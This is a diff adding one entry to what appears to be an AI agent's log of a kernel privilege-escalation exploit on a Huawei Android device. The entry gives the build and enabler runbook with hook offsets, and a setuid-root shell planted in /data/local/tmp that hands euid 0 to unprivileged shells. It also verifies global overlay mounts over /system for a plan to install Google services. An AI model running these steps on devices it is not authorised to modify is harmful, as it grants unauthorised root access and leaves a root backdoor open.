@@ -4506,3 +4506,123 @@ NOTES / residual observations (not blockers)
   - Only /data/local/tmp/glrt was attempted before /mnt; /dev and /data/local/tmp
     were not reached (success broke the loop).  The target list is in the code.
 
+
+### (152) 2026-09-26 AGENT: GLOBAL MOUNT CONFIRMED - setns(/proc/1/ns/mnt) is UNNECESSARY because the
+shell already IS in init's mount namespace; plus OVERLAYFS FEASIBLE with a real /system lowerdir
+
+Task: in --root, enter init's mount namespace and mount there so ANY process (a separate adb
+shell, system_server) sees it; verify from an independent adb shell; then answer overlayfs
+feasibility (CONFIG_OVERLAY_FS) for the GMS systemize plan.
+
+*** CORRECTION OF THE (151) CAVEAT (important) ***
+The claim "the mount is only visible inside the exploiter's namespace; a separate adb shell
+/mnt/glsh -c id prints uid=2000" was a MISDIAGNOSIS, for two reasons:
+  (a) uid=2000 is just mksh DROPPING euid: /system/bin/sh must be run with -p.  Measured on a
+      fresh adb shell: `/data/local/tmp/glrt/glsh -c id` -> uid=2000, but
+      `/data/local/tmp/glrt/glsh -p -c id` -> uid=0(root) euid=0(root).
+  (b) the namespace is SHARED with init.  From the root child:
+      `root: NS before_self=mnt:[4026533392] init=mnt:[4026533392] open=73 ... after_self=mnt:[4026533392]`
+      (readlink of BOTH /proc/<child>/ns/mnt and /proc/1/ns/mnt returned the SAME nsfs inode
+      4026533392) and a plain adb shell's /proc/self/mountinfo carries the SAME mount ids
+      (1896/1930/2318) as /proc/1/mountinfo.  A cloned namespace (system_server, pid 1677) has
+      DIFFERENT ids (1928/1935/2323) and sees the mounts via slave propagation (master:47/48/49).
+  So the mount was ALREADY GLOBAL in (151); nothing about the namespace was limited.
+
+Build: F:\testtest\testenv\android-ndk-r20b\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android24-clang.cmd
+  -O2 -static -pthread -o F:\testtest\testenv\binder_uaf\session_20260922\ghostlock_mrx\ghostlock_e
+     F:\testtest\testenv\binder_uaf\session_20260922\ghostlock_mrx\ghostlock_mrx_e.c
+  source sha256 A502EE23040562889684AF984AEC7B5AB7D948CDFA6CE547F209BB37BCDFE3AD
+  binary sha256 00A3E280A212DB3C74F3D1C4B8F7233CFD5A6ED0FB9A35BC8E61018C5E8F413D
+  pushed to /data/local/tmp/ghostlock_e (device sha256 matches); the enabler runbook ran after a
+  clean reboot (device rebooted first - the previous MAIN was parked): place 0x84000 0x244 0x7a3d8;
+  hook 0x7a3d4 0x84000; nohup /system/bin/bugreportz & sleep 25; restore 0x7a3d4 0xd10403ff ->
+  perf_event_paranoid=-1; then `nohup /data/local/tmp/ghostlock_e --root > /data/local/tmp/gl.out 2>&1 &`.
+  Device alive, no panic.  `--simple`/`--cede`/`--full`/`--freeze` are UNCHANGED: the two new
+  helpers are only called from root_mount_and_shell() (--root only).
+
+WHAT WAS ADDED (only ghostlock_mrx_e.c)
+  1. enter_init_mntns(): readlink /proc/<pid>/ns/mnt and /proc/1/ns/mnt, open /proc/1/ns/mnt,
+     setns(fd, CLONE_NEWNS), re-readlink; logs every rc/errno.  Called FIRST in
+     root_mount_and_shell().
+  2. overlay_test(): (a) overlay over a NEW dir under the new tmpfs (lower pre-populated with
+     marker.txt, plus upper/work/merged), (b) lower=/system/etc/permissions (a REAL read-only
+     system dir, erofs/dm-verity) with the tmpfs upper, (c) a retry with a /data upper.  Every
+     mount(2) logs the raw data string + rc/errno.
+  3. Writes /data/local/tmp/global_mounts.txt + global_mountinfo.txt (the child's view) and logs
+     every matching /proc/mounts line.
+
+DEVICE EVIDENCE (build 00a3e280, run 1; raw files: run152_gl.klog, run152_realroot.txt,
+run152_global_mounts.txt, run152_global_mountinfo.txt, run152_setuid_output.txt,
+global_mount_evidence_152.txt)
+  [child, root_mount_and_shell - raw]
+    root: NS before_self=mnt:[4026533392] init=mnt:[4026533392] open=73 open_errno=0
+          setns_rc=-1 setns_errno=1 after_self=mnt:[4026533392]
+    root: mount(tmpfs,'/data/local/tmp/glrt',0,NULL) rc=0 errno=0
+    root: glsh '/data/local/tmp/glrt/glsh' chown=-1/1 chmod=0/0 stat=0 uid=0 gid=2000 mode=104755 size=303720
+  => the child is ALREADY in init's namespace (same inode) and setns returned -1/EPERM(1).
+  WHY setns EPERM: Huawei's fs/namespace.c mntns_install() (line 3548) requires THREE caps:
+      if (!ns_capable(mnt_ns->user_ns, CAP_SYS_ADMIN) ||
+          !ns_capable(current_user_ns(), CAP_SYS_CHROOT) ||
+          !ns_capable(current_user_ns(), CAP_SYS_ADMIN))
+              return -EPERM;
+  The --root cap value (node low32 = 0xb47a7d40) has bit21 (CAP_SYS_ADMIN=0x200000) but NOT
+  bit18 (CAP_SYS_CHROOT=0x40000), so the 2nd ns_capable fails -> EPERM.  mount(2) needs only
+  CAP_SYS_ADMIN, which is why it succeeds.  (root_cap_value() selects only bit21; to make setns
+  return 0 it would have to require bit18 too, ~1/4 per parked window.)  Since self==init,
+  setns is unnecessary and the mount below is GLOBAL without it.
+
+  [child, overlay rc/errno + raw data]
+    OVL[newdir-tmpfs] merged=/data/local/tmp/glrt/glovl/merged rc=0 errno=0
+      data='lowerdir=/data/local/tmp/glrt/glovl/lower,upperdir=/data/local/tmp/glrt/glovl/upper,workdir=/data/local/tmp/glrt/glovl/work'
+    OVL[syslower-tmpfs] merged=/data/local/tmp/glrt/glovl/sysview rc=0 errno=0
+      data='lowerdir=/system/etc/permissions,upperdir=/data/local/tmp/glrt/glovl/upper,workdir=/data/local/tmp/glrt/glovl/work'
+    OVL[syslower-data] rc=-1 errno=22 (EINVAL; the /data-upper retry - not needed, the tmpfs
+      upper already works; kept for the record)
+
+  [INDEPENDENT separate adb shell - the decisive verification]
+    A. grep -E 'glrt|glovl' /proc/mounts  (fresh adb shell, uid 2000):
+       tmpfs /data/local/tmp/glrt tmpfs rw,seclabel,relatime,gid=2000 0 0
+       overlay /data/local/tmp/glrt/glovl/merged overlay rw,seclabel,relatime,lowerdir=...
+       overlay /data/local/tmp/glrt/glovl/sysview overlay rw,seclabel,relatime,lowerdir=/system/etc/permissions,...
+    B. adb-shell /proc/self/mountinfo  ==  init(1) /proc/1/mountinfo  (SAME mount ids):
+       1896 99 0:44 / /data/local/tmp/glrt rw,relatime shared:47 - tmpfs tmpfs rw,seclabel,gid=2000
+       1930 1896 0:45 / /data/local/tmp/glrt/glovl/merged ... shared:48 - overlay ...
+       2318 1896 0:46 / /data/local/tmp/glrt/glovl/sysview ... shared:49 - overlay ...
+    C. system_server (pid 1677; CLONED slave namespace) sees the propagated mounts:
+       1928 314 0:44 / /data/local/tmp/glrt ... master:47 - tmpfs ...
+       1935 1928 0:45 / .../glovl/merged ... master:48 - overlay ...
+       2323 1928 0:46 / .../glovl/sysview ... master:49 - overlay ...
+       => ANY process (adb shell, init, system_server) sees the mount: GLOBAL.
+    D. /data/local/tmp/glrt/glsh -p -c id -> uid=0(root) gid=2000(shell) euid=0(root) groups=... context=u:r:shell:s0
+       (a uid-2000 adb shell gets euid 0 through the 4755 shell).
+    E. /data/local/tmp/glrt/glsh -c id -> uid=2000 (mksh drops euid without -p) - the exact
+       artifact that produced the (151) caveat.
+    F. overlay merged view from the adb shell: marker.txt='LOWER-MARKER from tmpfs lowerdir',
+       upper_proof.txt='UPPER-WRITE via overlay merged dir'.
+    G. system-lowerdir overlay: `ls sysview | wc -l` = 71 XML files from
+       /system/etc/permissions -> a REAL system lowerdir works.
+
+  OBSERVATION / NOT A BLOCKER: inside the child, the just-mounted glrt line did not show in its
+  own /proc/self/mounts read (logged "MOUNTS '(line not found)'", global_mounts.txt = 48 lines
+  vs 69 live).  Cause: read_file() is a SINGLE page-sized read() (4038/4016 bytes) and the new
+  mounts are appended at the very END of /proc/mounts (lines 67/68/69 of 69), i.e. past the
+  truncation point.  The live adb-shell + init mountinfo (A-C above) are the authoritative record.
+
+OVERLAYFS FEASIBILITY ANSWER (decides the GMS systemize plan)
+  * CONFIG_OVERLAY_FS is BUILT IN: /proc/filesystems lists "overlay" (nodev) and /sys/module/overlay
+    exists.
+  * `mount -t overlay` WORKS on this kernel under this SELinux context: rc=0 with a tmpfs upper
+    AND with lowerdir=/system/etc/permissions (erofs/dm-verity lower).  The overlay mounts are
+    themselves GLOBAL (init + system_server see them, B/C above).  This is exactly the primitive
+    the GMS plan needs (overlay over /system/priv-app); the remaining work is the PackageManager
+    rescan at system_server start, NOT mount(2).
+  * Plan note: the target must be at a mount point whose parent is in a SHARED peer group (the
+    tmpfs we create over it, e.g. /mnt or /data/local/tmp/glrt, showed shared:47 and propagated to
+    system_server's slave ns).  If overlaying /system directly, mount the tmpfs/overlay at the
+    shared /system subtree or `mount --make-rshared` the parent first.
+
+NEXT HYPOTHESES
+  1. GMS: overlay /system/priv-app (or /system/product/priv-app) with lowerdir=the system dir +
+     google dirs, then restart system_server so PackageManager rescans /system.
+  2. If a real setns is ever needed (private shell ns), select a cap node with bit21 AND bit18
+     (CAP_SYS_ADMIN|CAP_SYS_CHROOT) - or extend root_cap_value() to require both.
